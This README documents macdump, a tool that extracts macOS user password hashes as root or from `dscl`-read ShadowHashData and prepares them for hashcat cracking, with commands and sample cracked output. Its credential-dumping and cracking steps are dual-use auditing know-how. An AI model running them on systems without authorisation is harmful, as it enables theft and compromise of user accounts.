# macdump

Dump macOS 1.8+ system user hashes to a hashcat-compatible format.
Can work either directly on the target system to dump hashes of all users (root
required) or offline on shadow hash data extracted from the system.

## Installation

Use the package manager pip to install to a local machine:

```bash
pip install macdump
```

To get a standalone executable to be transfered to target systems, either download
one from the release pages or build it with [pyinstaller](https://pyinstaller.org/en/stable/),
as shown in the [Makefile](Makefile) (`make build-executable`).

If Python is installed (it should be), you can also just copy the standalone
version of the script. Find it in [macdump.py](macdump.py)

## Usage

### On target system

To run macdump directly on the target system, transfer either the standalone
binary or the script [macdump.py](macdump.py) and run it as root.
Output will be roughly as seen below:

Running the script (`sudo python macdump.py`) or the binary (`sudo ./macdump`):

```
 $ sudo python3 macdump.py
[+] Dumping hashes of all system users
[+] Dumping hash of testuser
[+] Authentication hint:  This is our default password
testuser:$ml$45871$f601fc65d033857cfc926ec2332058f791c1844f4e4fbb763568e063eafd742b$6eaf4c347e36648d471fe07fcf17b099d5f82ad050438d39dbad18a824b86d23165e69a881d699b0f3442658fe3ab77e9720e37386e6d05ef4f945b443f61b51427582447514b810e3be3dce5d70ea8ec215b2babeed0d92275ad662a04467134140a807c28178bb377503a50d4be1ba9d5944af88df04824a7075d1f9f116d5
[+] Put hashes into file 'hashes.txt', then crack with: hashcat -m 7100 --username hashes.txt -a 0 wordlist.txt
```

### Offline

You can extract the shadow hash data, store it to a text file and use that as
input for macdump.
To get the data for user `username`, run:

```bash
sudo dscl . -read /Users/username dsAttrTypeNative:ShadowHashData > /tmp/shd.txt
```

Note: You may also just include all data by running `sudo dscl . -read /Users/username > /tmp/shd.txt`,
which will output a lot of text. macdump finds what it needs.

Then get `/tmp/shd.txt` over to your machine and run:

```bash
 $ macdump --from-file /tmp/shd.txt
[+] Loading shadow hash data from /tmp/shd.txt
UNKNOWN_USER:$ml$45871$f601fc65d033857cfc926ec2332058f791c1844f4e4fbb763568e063eafd742b$6eaf4c347e36648d471fe07fcf17b099d5f82ad050438d39dbad18a824b86d23165e69a881d699b0f3442658fe3ab77e9720e37386e6d05ef4f945b443f61b51427582447514b810e3be3dce5d70ea8ec215b2babeed0d92275ad662a04467134140a807c28178bb377503a50d4be1ba9d5944af88df04824a7075d1f9f116d5
[+] Put hashes into file 'hashes.txt', then crack with: hashcat -m 7100 --username hashes.txt -a 0 wordlist.txt
```

### Cracking

Hashes are printed in hashcat format including usernames.
Store them inside a file `hashes.txt`, then run a command like the following:

```
 $ hashcat -m 7100 --username hashes.txt -a 0 wordlist.txt

hashcat (v6.2.5) starting

...

$ml$45871$f601fc65d033857cfc926ec2332058f791c1844f4e4fbb763568e063eafd742b$6eaf4c347e36648d471fe07fcf17b099d5f82ad050438d39dbad18a824b86d23165e69a881d699b0f3442658fe3ab77e9720e37
386e6d05ef4f945b443f61b51427582447514b810e3be3dce5d70ea8ec215b2babeed0d92275ad662a04467134140a807c28178bb377503a50d4be1ba9d5944af88df04824a7075d1f9f116d5:pass123

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 7100 (macOS v10.8+ (PBKDF2-SHA512))
...
```

Try this with the hash seen in the readme and a wordlist containing password
`pass123` to verify that your setup works.

## License
[MIT](https://choosealicense.com/licenses/mit/)
